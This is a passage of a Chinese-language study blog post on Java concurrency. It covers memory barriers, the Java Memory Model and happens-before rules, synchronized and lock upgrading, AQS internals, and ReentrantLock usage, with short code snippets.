<li>LoadStore屏障：禁止前面的Load和后面的写（Store）重排</li>
<li>StoreStore屏障：禁止前面的Store重排和后面的Store重排</li>
<li>StoreLoad屏障：禁止前面的Store重排和后面的Load重排</li>
</ul>
<p>JVM编译器会按照上述规则在程序编译生成的指令中插入内存屏障，规则是：</p>
<ol>
<li>对于volatile读<ol>
<li>后面插入一个LoadLoad屏障</li>
<li>后面插入一个LoadStore屏障</li>
</ol>
</li>
<li>对于volatile写<ol>
<li>前面插入一个StoreStore屏障</li>
<li>后面插入一个StoreLoad屏障</li>
</ol>
</li>
</ol>
<h4 id="DCL单例"><a href="#DCL单例" class="headerlink" title="DCL单例"></a>DCL单例</h4><p>DCL（Double Check Lock）单例为什么需要加volatile：</p>
<p>如果不加volatile，不能避免指令重排序，初始化指令和堆栈建立连接的指令可能会倒换，即可能出现堆栈建立连接发生在初始化指令之前，即</p>
<ul>
<li>加volatile，没有被重排序的指令执行过程如下<ol>
<li>初始化指令</li>
<li>堆栈建立连接的指令</li>
</ol>
</li>
<li>不加volatile，可能出现的重排序的指令执行过程如下<ul>
<li>堆栈建立连接的指令</li>
<li>初始化指令</li>
</ul>
</li>
</ul>
<p>这就导致在多线程环境下，如果没有使用volatile，假如一个线程正在使用创建对象，并且发生了指令重排序，使得堆栈建立连接的指令发生在初始化指令之前，那么当这条线程恰好执行完堆栈建立连接的指令，还没有执行初始化指令时，有一个新的线程线程执行DCL单例的函数，判断得到栈中已经指向堆中已有的对象，就会执行返回此对象，而此时对象还没有被初始化，此时获取的对象的值仅仅是默认值而不是初始化的值。</p>
<h3 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h3><p>Java内存模型简称JMM，是Java为了解决可见性和有序性问题而指定的一种编程规范。</p>
<p>主内存：主要对应于Java堆中存储对象实例数据的部分</p>
<p>工作内存：主要对应于虚拟机栈中的部分区域</p>
<h4 id="JMM的概念"><a href="#JMM的概念" class="headerlink" title="JMM的概念"></a>JMM的概念</h4><p>对于线程的工作内存和主内存之间的数据交互，JMM规定了变量从主内存复制到工作内存，以及从工作内存同步到主内存的实现细节。</p>
<p>JMM规定</p>
<ol>
<li>所有变量都存储在主内存中，也就是存储在计算机的物理内存中</li>
<li>每个线程都有自己的工作内存，用于存储线程私有数据</li>
<li>线程不能直接访问其他线程的工作内存中的数据，只能通过主内存进行数据交互</li>
<li>当线程需要操作变量时，需要先将主内存中的变量复制到对应的工作内存中</li>
</ol>
<p>JMM同步数据的八种操作：</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>名称</th>
<th>目标</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>lock</td>
<td>加锁</td>
<td>主内存中的变量</td>
<td>把主内存中的变量标记为线程独占的状态</td>
</tr>
<tr>
<td>unlock</td>
<td>解锁</td>
<td>主内存中的变量</td>
<td>释放主内存中锁定的变量，释放后可以被其他线程锁定</td>
</tr>
<tr>
<td>store</td>
<td>存储</td>
<td>工作内存中的变量</td>
<td>把工作内存中的变量的值刷新到主内存中，以便随后的write操作使用</td>
</tr>
<tr>
<td>write</td>
<td>写入</td>
<td>工作内存中的变量</td>
<td>把store操作从工作内存中得到的变量写入到主内存的变量中</td>
</tr>
<tr>
<td>read</td>
<td>读取</td>
<td>主内存中的变量</td>
<td>把主内存中的变量写入到工作内存中</td>
</tr>
<tr>
<td>load</td>
<td>载入</td>
<td>主内存中的变量</td>
<td>将read操作从主内存中得到的变量值载入工作内存的变量中</td>
</tr>
<tr>
<td>use</td>
<td>使用</td>
<td>工作内存中的变量</td>
<td>将工作内存中的变量值传递给执行引擎</td>
</tr>
<tr>
<td>assign</td>
<td>赋值</td>
<td>工作内存中的变量</td>
<td>执行引擎将值赋值给工作内存中的变量</td>
</tr>
</tbody></table>
<h4 id="Happens-Before原则"><a href="#Happens-Before原则" class="headerlink" title="Happens-Before原则"></a>Happens-Before原则</h4><p>在JMM中定义了一套Happens-Before原则，用于保证程序在执行过程中的可见性和有序性。</p>
<p>Happens-Before原则主要包括以下内容：</p>
<ol>
<li><p>程序次序原则</p>
<p>写在前面的操作先行发生于写在后面的操作</p>
</li>
<li><p>volatile变量原则</p>
<p>对一个volatile变量的写操作必然发生在后续对这个变量的读操作之前</p>
</li>
<li><p>传递原则</p>
<p>ABC三个操作，A先于B，B先于C，则A先于C</p>
</li>
<li><p>监视锁规则</p>
<p>对监视器的加锁发生在解锁之前</p>
</li>
<li><p>锁定原则</p>
<p>先解锁才能加锁</p>
</li>
<li><p>线程启动原则</p>
<p>线程start()后才能执行线程中的代码</p>
</li>
<li><p>线程中断原则</p>
<p>对线程的interrupt()方法的调用发生在中断事件产生之前</p>
</li>
<li><p>线程终结原则</p>
<p>线程结束后，其他线程能够访问到该线程修改后的共享变量的值</p>
</li>
<li><p>对象终结原则</p>
<p>一个对象的初始化必然在其finalize()方法之前执行</p>
</li>
</ol>
<h1 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h1><h2 id="synchronized用法"><a href="#synchronized用法" class="headerlink" title="synchronized用法"></a>synchronized用法</h2><p>synchronized用法分三种：</p>
<ol>
<li><p>同步实例方法</p>
<p>当类的普通方法被synchronized修饰时，相当于对this加锁，这个方法被声明为同步方法。</p>
</li>
<li><p>同步静态方法</p>
<p>当类的静态方法被synchronized修饰时，相当于对这个类的Class对象（.class）加锁，而一个类只对应一个Class对象。</p>
</li>
<li><p>同步代码块</p>
<p>通过对互不影响的临界区资源分别加锁（可能需要创建锁对象），可以减小对临界区资源的等待，提高程序的执行效率。</p>
</li>
</ol>
<p>可以由此将synchronized的锁分成两类锁：</p>
<p><strong>对象锁</strong>：对实例方法和同步代码块加的锁称为对象锁</p>
<p><strong>类锁</strong>：对静态方法加的锁称为类锁</p>
<h2 id="Java对象结构"><a href="#Java对象结构" class="headerlink" title="Java对象结构"></a>Java对象结构</h2><p>Java对象结构按照顺序由以下几部分组成：</p>
<ol>
<li>对象头<ol>
<li>Mark Word</li>
<li>类型指针</li>
<li>数组长度（仅在当前对象是数组时才会存在）</li>
</ol>
</li>
<li>实例数据</li>
<li>对齐填充</li>
</ol>
<p>以下是对Java对象组成部分的详细说明（64位JVM下）：</p>
<ol>
<li><p>对象头（8 + 4 + 4 &#x3D; 12 + 4 &#x3D; 16字节）</p>
<ol>
<li><p>Mark Word（8字节）</p>
<p>Mark Word用于存储对象的运行时数据，按照锁状态可以分为以下几类：</p>
<ul>
<li>无锁：对象的Hash码（31位）、GC的分代年龄（4位）、偏向锁标记（1位）、锁的状态标志（2位）</li>
<li>偏向锁：偏向锁线程id（54位）、获得偏向锁的时间戳（2位）、GC的分代年龄、偏向锁标记、锁的状态标志</li>
<li>轻量级锁：轻量级锁指针（指向栈中锁的指针，62位）、锁的状态标志</li>
<li>重量级锁：重量级锁指针（指向对象监视器的指针，62位）、锁的状态标志</li>
<li>GC标记（GC标记用于标记可以回收的垃圾对象）：锁的状态标志</li>
</ul>
</li>
<li><p>类型指针（4字节，默认开启压缩，由8字节压缩为4字节）</p>
<p>类的类元信息存储在JVM的方法区中，对象头的类型指针会指向存储在方法区中的类元信息</p>
<p>不同位数的JVM中长度不同，在32位JVM中，类型指针占用32位的存储空间，64位JVM中，占用64位。</p>
</li>
<li><p>数组长度（仅在当前对象是数组时才会存在，4字节）</p>
</li>
</ol>
</li>
<li><p>实例数据</p>
<p>存储对象的成员变量信息，既包含了类的成员变量值（具体值），也包含了父类的成员变量值</p>
</li>
<li><p>对齐填充</p>
<p>以满足JVM中对象的起始地址是8的整数倍的要求，所以对象的实例变量占用的存储空间需要是8字节的整数倍</p>
</li>
</ol>
<h2 id="使用JOL查看对象结构"><a href="#使用JOL查看对象结构" class="headerlink" title="使用JOL查看对象结构"></a>使用JOL查看对象结构</h2><p>为了方便查看JVM中对象结构并计算某个对象的大小，OpenJDK提供了一个JOL工具包</p>
<p>定义了一个int[]数组，并使用JOL提供的方法输出对象信息：</p>
<img src="./Java并发编程/image-20230516191412412.png" alt="image-20230516191412412" style="zoom:93%;" />

<p>输出的Java对象信息：</p>
<img src="./Java并发编程/image-20230516190422449.png" alt="image-20230516190422449" style="zoom: 80%;" />

<h2 id="synchronized底层实现"><a href="#synchronized底层实现" class="headerlink" title="synchronized底层实现"></a>synchronized底层实现</h2><p>JVM是基于JVM中的monitor锁实现的，Java1.5版本之前的synchronized锁性能较低，但是从Java1.6开始，对synchronized锁进行了优化，引入了锁升级、锁粗化、锁消除等技术来提高synchronized的性能。</p>
<ol>
<li><p>字节码层面</p>
<ul>
<li><p>synchronized修饰的方法的字节码会比普通方法多一个ACC_SYNCHRONIZED标识符</p>
</li>
<li><p>synchronized修饰的代码块的字节码会在同步代码块的前后分别添加monitorenter和monitorexit指令</p>
</li>
</ul>
</li>
<li><p>JVM层面</p>
<p>synchronized修饰方法和代码块，在底层实现上没有本质区别</p>
<p>重量级锁的底层是基于Monitor锁实现的</p>
</li>
<li><p>操作系统层面</p>
<p>轻量级锁的底层是基于CAS实现的</p>
<p>Monitor锁是基于操作系统的Mutex锁实现的，Mutex锁是操作系统级别的重量级锁。</p>
</li>
</ol>
<h2 id="Monitor锁原理"><a href="#Monitor锁原理" class="headerlink" title="Monitor锁原理"></a>Monitor锁原理</h2><p>重量级锁的底层是基于Monitor锁实现的，而Monitor锁又是基于操作系统的Mutex锁实现的</p>
<p>在Java中创建出来的任何一个对象都会关联一个Monitor对象，当Monitor对象被一个Java对象持有后（Monitor对象的owner参数不为空），这个Monitor对象就会处于锁定状态。</p>
<p>在HotSpot JVM中，Monitor对象是由ObjectMonitor实现的，ObjectMonitor 是JVM中用于实现对象的同步、监视和锁定的重要数据结构。ObjectMonitor的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">ObjectMonitor() &#123;<br>    _header       = <span class="hljs-literal">NULL</span>;<br>    _count        = <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录线程获取锁的次数</span><br>    _waiters      = <span class="hljs-number">0</span>,<br>    _recursions   = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 锁的重入次数</span><br>    _object       = <span class="hljs-literal">NULL</span>;<br>    _owner        = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 指向持有ObjectMonitor对象的线程</span><br>    _WaitSet      = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 处于wait状态的线程，会被加入到_WaitSet</span><br>    _WaitSetLock  = <span class="hljs-number">0</span> ;<br>    _Responsible  = <span class="hljs-literal">NULL</span> ;<br>    _succ         = <span class="hljs-literal">NULL</span> ;<br>    _cxq          = <span class="hljs-literal">NULL</span> ;<br>    FreeNext      = <span class="hljs-literal">NULL</span> ;<br>    _EntryList    = <span class="hljs-literal">NULL</span> ;  <span class="hljs-comment">// 处于等待锁block状态的线程，会被加入到该列表</span><br>    _SpinFreq     = <span class="hljs-number">0</span> ;<br>    _SpinClock    = <span class="hljs-number">0</span> ;<br>    OwnerIsThread = <span class="hljs-number">0</span> ;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>ObjectMonitor的几个关键属性 <code>count、recursions、owner、WaitSet、 EntryList</code> 体现了monitor的工作原理</p>
<p>synchronized加锁与解锁在JVM底层的实现流程大致分为以下几步：</p>
<ol>
<li><p>被阻塞的线程被封装成ObjectWaiter对象进入<code>_EntryList</code>，获取到锁（获取到Monitor对象）的线程就会被<code>_owner</code>指向，并把ObjectMonitor对象的<code>_count</code>变量值加1。</p>
</li>
<li><p>当线程调用wait()方法时，当前线程会释放持有的ObjectMonitor对象，并把<code>_owner</code>变量值设为NULL，<code>_count</code>变量值减1。</p>
<p>由于wait()、notify()、notifyAll()等方法在执行过程中会使用ObjectMonitor对象，所以，必须在同步代码块或方法中调用这些方法。</p>
</li>
<li><p>如果获取到ObjectMonitor对象的线程执行完毕，则会释放ObjectMonitor对象，将ObjectMonitor对象中的<code>_count</code>变量值减1（当<code>_count</code>变量值再次为0，当前线程就成功的释放了锁），<code>_owner</code>变量值设为NULL。</p>
</li>
</ol>
<h2 id="锁升级的过程"><a href="#锁升级的过程" class="headerlink" title="锁升级的过程"></a>锁升级的过程</h2><p>锁升级的过程经历以下几个阶段</p>
<ol>
<li><p>无锁</p>
</li>
<li><p>偏向锁</p>
</li>
<li><p>轻量级锁（自旋锁）</p>
</li>
<li><p>重量级锁</p>
</li>
</ol>
<p>Java锁对象由无锁升级为重量级锁的详细步骤：</p>
<ol>
<li><p>线程的抢占锁时首先会检查偏向锁标记位和锁标记位，如果发现是偏向锁，进行锁竞争的一般流程：</p>
<ol>
<li>线程获取锁：线程会检查Mark Word中的偏向锁线程id是否是自己的线程id<ol>
<li>如果是，则当前线程已经持有了锁，直接执行同步代码</li>
<li>如果不是，则当前线程会通过CAS自旋的方式尝试将Mark Word中的偏向锁线程id设为自己的线程id<ol>
<li>CAS操作成功，将Mark Word中的偏向锁线程id设为自己的线程id的操作成功</li>
<li>CAS操作失败，说明此时有其他线程也在争抢锁资源，此时会撤销偏向锁，升级为轻量级锁</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li><p>如果发现是轻量级锁，进行锁竞争的一般流程：</p>
<ol>
<li><p>将锁对象的 Mark Word 备份到 Displaced Mark Word （当线程被创建后，JVM会在线程的栈帧中创建一个用于存储锁记录（Lock Record）的空间，里面存储了owner和Displaced Mark Word）中，并将栈帧的owner指针指向锁对象</p>
</li>
<li><p>尝试通过 CAS 将锁对象的 Mark Word 更新为指向 Displaced Mark Word 的指针</p>
<ol>
<li><p>如果CAS操作成功，表示当前线程成功获取了轻量级锁，并进入临界区执行。</p>
</li>
<li><p>如果已经指向其他线程，竞争锁失败，会进行CAS操作</p>
<ol>
<li><p>自旋等待：如果CAS操作失败，表示锁对象已经被其他线程占用。此时，请求锁的线程会进入自旋等待状态。在自旋等待状态下，线程会反复尝试使用CAS操作获取锁，而不会被阻塞。</p>
</li>
<li><p>自旋限制：CAS自旋操作超过一定的次数仍未抢占到锁，轻量级锁会膨胀为重量级锁，进入阻塞状态。</p>
<p>对于自旋次数上限值，JDK中提供了自适应自旋的方案，如果当前线程的CAS自旋成功，就会增大下一次的自旋次数上限值，如果失败，就会减小。</p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>当线程释放锁</p>
<ol>
<li>如果锁对象还是轻量级锁的状态，当前线程就会使用CAS操作将Displaced Mark Word中存储的信息复制到锁对象的Mark Word中</li>
<li>如果锁对象已经升级为了重量级锁，当前线程就会释放锁并唤醒其他被阻塞的线程争抢锁</li>
</ol>
</li>
</ol>
</li>
<li><p>如果发现是重量级锁，进行锁竞争的一般流程：</p>
<ol>
<li>线程请求锁：当一个线程需要获取重量级锁时，它会向操作系统发送请求。<ol>
<li><p>如果当前没有其他线程持有锁，请求的线程会成功获取锁，并进入临界区执行。</p>
</li>
<li><p>如果锁已经被其他线程占用，请求的线程将进入阻塞等待状态，线程会被操作系统挂起，不会占用CPU资源。</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>Java锁对象由无锁升级为重量级锁的其他途径：</p>
<ol>
<li><p>计算一致性哈希</p>
<p>只要锁对象计算过一致性哈希，偏向模式就置为0了，也就意味着该对象锁不能再偏向了，最低也会膨胀会轻量级锁。<br>如果对象锁处于偏向模式时遇到计算一致性哈希请求，那么会跳过轻量级锁模式，直接膨胀为重量级锁。</p>
</li>
</ol>
<h2 id="锁降级"><a href="#锁降级" class="headerlink" title="锁降级"></a>锁降级</h2><p>重量级锁的降级只会发生在GC期间的STW阶段，只能降级为可以被JVM线程访问，而不被其他Java线程访问的对象。</p>
<h1 id="AQS核心原理"><a href="#AQS核心原理" class="headerlink" title="AQS核心原理"></a>AQS核心原理</h1><p>，</p>
<p>AQS（AbstractQueuedSynchronizer）是volatile和CAS和队列的组合应用</p>
<p>java中哪些同步锁是基于AQS实现的：</p>
<p>Java 并发包 <code>java.util.concurrent</code> 中的许多同步工具类都是基于 <code>AbstractQueuedSynchronizer</code> (简称 AQS) 来实现的。AQS 是一个用于构建锁和同步器的框架，它使用一个 int 成员变量来表示同步状态，并提供了一种使用 CAS（Compare-and-Swap）设置同步状态的方式。以下是一些基于 AQS 实现的同步类：</p>
<ol>
<li><p><strong>ReentrantLock</strong>：重入锁，是一种互斥锁，它的特点是支持重入功能，也就是说，一个线程能够对已经获取到的锁再次获取，而不会发生死锁。</p>
</li>
<li><p><strong>ReentrantReadWriteLock</strong>：读写锁，它分为两个锁，一个是读锁，一个是写锁。多个读锁之间不会互斥，读锁与写锁互斥，写锁与写锁互斥。这是由jvm自己控制的，你只要上好相应的锁即可。</p>
</li>
<li><p><strong>Semaphore</strong>：信号量，内部维护了一组”许可”，线程可以申请许可（如果无可用许可则阻塞），也可以释放许可。信号量可用于实现资源池，或者对某个操作的并发线程数进行限制。</p>
</li>
<li><p><strong>CountDownLatch</strong>：倒计时门栓，它可以让一个或多个线程等待其他线程完成各自的工作后再执行。</p>
</li>
<li><p><strong>CyclicBarrier</strong>：循环栅栏，它允许一组线程互相等待，直到所有的线程都准备就绪后，所有的线程才能继续执行。</p>
</li>
<li><p><strong>FutureTask</strong>：一个实现了 <code>Future</code> 和 <code>Runnable</code> 接口的类，可以用来执行 <code>Callable</code> 任务，并且可以获取任务执行后的结果。</p>
</li>
</ol>
<p>这些类都通过自定义 AQS 来实现它们自己的同步语义。</p>
<h2 id="AQS数据结构原理"><a href="#AQS数据结构原理" class="headerlink" title="AQS数据结构原理"></a>AQS数据结构原理</h2><p>AQS（AbstractQueuedSynchronizer，抽象队列同步器）是Java中提供的一个抽象类，位于java.util.concurrent.locks包下</p>
<p>AQS的数据结构主要包括以下几个部分：</p>
<ol>
<li><p>两类FIFO（先进先出）的双向链表（同步队列和同步条件队列）</p>
<p>链表中的每个节点都是对线程的封装，如果线程竞争锁失败，就会被封装成一个Node节点加入AQS队列的尾部。当获取锁的线程释放锁之后，会从AQS中唤醒一个被阻塞的线程。</p>
<ol>
<li>同步队列通过addWaiter()方法添加到队列的尾部，通过acquire()方法退出同步队列</li>
<li>同步条件队列addConditionWaiter()方法添加到队列的尾部，通过doSignal()方法退出同步队列。AQS中的同步条件队列就是为Lock锁实现的一个基础同步器，只有在使用了Condition时会存在条件队列，并且一个线程可能存在多个条件队列</li>
</ol>
</li>
<li><p>头节点指针、尾节点指针</p>
<p>头节点指针指向的节点封装的线程会占用资源，同时会通过CAS的方式更新state变量、头&#x2F;尾节点指针的指针的指向。</p>
</li>
<li><p>用来标识状态的volatile修饰的变量state</p>
<p>AQS中使用getState()方法读取state变量的值，使用setState()（无法保证原子性）和compareAndSetState()方法（能够保证原子性）设置state变量的值</p>
</li>
<li><p>Node类，AQS实现的独占锁和共享锁是在其静态内部类Node中定义的</p>
<p>静态内部类Node是一个双向链表，节点中保存了当前的状态waitState和当前线程thread。通过SHARED和EXCLUSIVE定义共享或独占状态。</p>
<p>Node中有四个常量，是waitState变量的取值，waitState变量也是用volatile修饰：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/** waitStatus value to indicate thread has cancelled */</span><br><span class="hljs-comment">// 表示当前节点中的线程已被取消</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;<br><span class="hljs-comment">/** waitStatus value to indicate successor&#x27;s thread needs unparking */</span><br><span class="hljs-comment">// 表示后继节点中的线程处于等待状态，需要被唤醒</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><span class="hljs-comment">/** waitStatus value to indicate thread is waiting on condition */</span><br><span class="hljs-comment">// 表示当前节点中的线程在等待某个条件，也就是当前节点处于condition队列中</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * waitStatus value to indicate the next acquireShared should</span><br><span class="hljs-comment"> * unconditionally propagate</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 表示在当前场景下能够执行后续的acquireShared操作</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="AQS底层对锁的支持"><a href="#AQS底层对锁的支持" class="headerlink" title="AQS底层对锁的支持"></a>AQS底层对锁的支持</h2><p>Java中java.util.concurrent包下的大部分工具类的实现都基于AQS（都extends Sync，而Sync extends AbstractQueuedSynchronizer）。基于AQS的工具类：</p>
<img src="./Java并发编程/image-20230517221126607.png" alt="image-20230517221126607" style="zoom:80%;" />

<p>AQS底层支持独占锁和共享锁两种模式：</p>
<ol>
<li>独占锁同一时刻只能被一个线程占用，如ReentrantLock</li>
<li>共享锁同一时刻可以被多个线程占用，如CountDownLatch、Semaphore等</li>
<li>有的锁实现类同时实现了独占锁和共享锁两种模式：如ReentrantReadWriteLock</li>
</ol>
<h2 id="独占锁和共享锁的实现流程"><a href="#独占锁和共享锁的实现流程" class="headerlink" title="独占锁和共享锁的实现流程"></a>独占锁和共享锁的实现流程</h2><p><strong>独占锁模式下的加锁流程：</strong></p>
<p>独占锁加锁的入口是acquire()方法，当线程调用acquire()方法获取独占锁时，首先会调用tryAcquire()方法尝试获取锁资源，如果获取失败返回false，就会调用addWaiter()方法将当前线程封装为Node节点，添加到AQS队列的尾部。然后调用acquireQueued()方法在等待队列中排队，在acquireQueued()方法中进入一个循环逻辑：如果监测到前驱节点是head节点，就尝试获取锁，如果获取成功就将head指向当前Node节点；如果前驱节点不是head节点，就调用shouldParkAfterFailedAcquire()方法判断是否可以进入waiting状态，如果可以，就进入阻塞状态直到调用LockSupport的unpark()方法唤醒当前线程。</p>
<p><strong>独占锁模式下的解锁流程：</strong></p>
<p>独占锁模式中，释放锁的入口方法是release()，在release()方法中首先会调用tryRelease()方法尝试释放锁，如果返回true，并且head节点不为空且head节点的waitState状态不为0，会调用unparkSuccessor()方法唤醒队列最前面可以被唤醒的节点。</p>
<p><strong>共享锁模式下的加锁流程：</strong></p>
<p>共享锁加锁的入口是acquireShared()方法，当线程调用acquireShared()方法获取共享锁时，首先会调用tryAcquireShared()方法尝试获取锁资源，如果获取失败返回负数，就会调用doAcquireShared()方法将当前线程封装为Node节点，添加到AQS队列的尾部并阻塞。然后监测前驱节点是否是head节点，就尝试获取锁，如果获取成功就将head指向当前Node节点，如果同时还有剩余资源则继续唤醒队列中后面的线程；如果前驱节点不是head节点，就调用shouldParkAfterFailedAcquire()方法判断是否可以进入waiting状态，如果可以，就进入阻塞状态直到调用LockSupport的unpark()方法唤醒当前线程。</p>
<p><strong>共享锁模式下的解锁流程：</strong></p>
<p>共享锁模式中，释放锁的入口方法是releaseShared()，在release()方法中首先会调用tryReleaseShared()方法尝试释放锁，如果返回true，就执行doReleaseShared()方法唤醒队列后面的线程。</p>
<h1 id="Lock锁核心原理"><a href="#Lock锁核心原理" class="headerlink" title="Lock锁核心原理"></a>Lock锁核心原理</h1><h2 id="显示锁"><a href="#显示锁" class="headerlink" title="显示锁"></a>显示锁</h2><p>Lock显示锁和synchronized隐式锁</p>
<ol>
<li>Lock锁都是手动写代码去获取锁和释放锁的，所以也叫显示锁</li>
<li>而当调用synchronized修饰的代码时，并不需要显示的加锁和解锁的过程，所以称之为隐式锁</li>
</ol>
<p>JUC显示锁中核心的接口是Lock接口，位于java.util.concurrent.locks包下：</p>
<img src="./Java并发编程/image-20230517172627640.png" alt="image-20230517172627640" style="zoom:80%;" />

<p>Lock接口提供的方法：</p>
<img src="./Java并发编程/image-20230517173037786.png" alt="image-20230517173037786" style="zoom:80%;" />

<h2 id="公平锁和非公平锁的原理"><a href="#公平锁和非公平锁的原理" class="headerlink" title="公平锁和非公平锁的原理"></a>公平锁和非公平锁的原理</h2><p>公平锁中的线程在抢占锁时首先会判断等待队列是否为空，如果队列为空或者当前线程是队列的队首元素，则当前线程获取到锁资源，否则会被放入队列尾部等待获取锁</p>
<p>非公平锁中的线程在抢占锁时会先直接尝试抢占锁，如果抢占成功就继续执行程序的业务逻辑，如果抢占失败，才会进入等待队列中等待</p>
<p>ReentrantLock支持公平锁和非公平锁，在使用时公平锁和非公平锁的用法一样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建公平锁实例</span><br><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 创建公平锁</span><br><span class="hljs-comment">// Lock lock = new ReentrantLock(false); // 创建非公平锁</span><br><span class="hljs-comment">// Lock lock = new ReentrantLock(); // 创建非公平锁</span><br><span class="hljs-keyword">try</span> &#123;<br>	lock.lock();<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>	lock.unlock();<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="悲观锁和乐观锁的原理"><a href="#悲观锁和乐观锁的原理" class="headerlink" title="悲观锁和乐观锁的原理"></a>悲观锁和乐观锁的原理</h2><p>悲观锁的核心思想是对数据是否被修改持有悲观态度，认为其他线程会修改数据，所以在线程每次获取数据时都会加锁。</p>
<p>乐观锁的核心思想是对数据是否被修改持有乐观态度，认为其他线程不会修改数据，所以在线程每次获取数据时都不会加锁。乐观锁适合读多写少的场景。</p>
<p>synchronized锁就是悲观锁</p>
<p>java.util.concurrent.atomic包下的原子类就是乐观锁</p>
<p>AtomicInteger类的用法示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">atomicInteger</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(); <span class="hljs-comment">//创建原子类</span><br>atomicInteger.incrementAndGet(); <span class="hljs-comment">//加1</span><br><span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> atomicInteger.get(); <span class="hljs-comment">// get值</span><br></code></pre></td></tr></table></figure>

<h2 id="可中断锁和不可中断锁的原理"><a href="#可中断锁和不可中断锁的原理" class="headerlink" title="可中断锁和不可中断锁的原理"></a>可中断锁和不可中断锁的原理</h2><p>可中断锁指在多个线程抢占的过程中可以被中断的锁。</p>
<p>不可中断锁指在多个线程抢占的过程中不可以被中断的锁。</p>
<p>ReentrantLock，就是可中断锁，ReentrantLock支持两种可中断锁的使用方式，lockInterruptibly()和tryLock(long timeout, TimeUnit unit)，如果当前线程在抢占锁的过程中被中断，就会抛出InterruptedException()用法示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>	lock.lockInterruptibly();<br>&#125; <span class="hljs-keyword">catch</span> (InterruptedException) &#123;<br>	<span class="hljs-comment">// 抢占锁被中断</span><br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>	lock.unlock();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>synchronized锁是不可中断锁，只能在抢占锁成功后被中断，不能在抢占锁的过程中被中断。</p>
<h2 id="独占锁和共享锁的原理"><a href="#独占锁和共享锁的原理" class="headerlink" title="独占锁和共享锁的原理"></a>独占锁和共享锁的原理</h2><p>按照加锁后的资源能否在被多个线程访问，可以将锁分为独占锁和共享锁</p>
<p>线程获取到独占锁后，其他线程如果想要获取该锁，只能等待。</p>
<p>线程获取到共享锁后，其他线程也可以获取到该锁，但是共享锁只允许对临界区的数据进行读取操作，不允许修改。也就是说，共享锁是针对读操作的锁。</p>
<p>synchronized锁、ReentrantLock锁、ReentrantReadWriteLock的写锁都是独占锁。</p>
<p>ReentrantReadWriteLock的读锁、Semaphore类、CountDownLatch类都是共享锁。</p>
